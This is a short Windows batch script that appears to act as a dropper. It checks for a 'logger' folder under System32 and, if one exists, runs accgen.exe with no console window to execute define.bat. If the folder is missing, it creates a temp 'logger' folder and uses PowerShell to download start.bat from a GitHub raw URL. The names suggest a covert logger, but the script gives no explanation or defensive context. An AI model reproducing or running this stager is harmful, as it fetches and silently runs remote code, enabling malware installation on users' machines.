@echo off
if exist "C:\Windows\System32\logger" (
  C:\Windows\System32\logger\accgen.exe  /NOCONSOLE /RUNAS C:\Windows\System32\logger\define.bat
) else (
  mkdir %temp%\logger
  powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/start.bat -OutFile %temp%\logger\start.bat
)
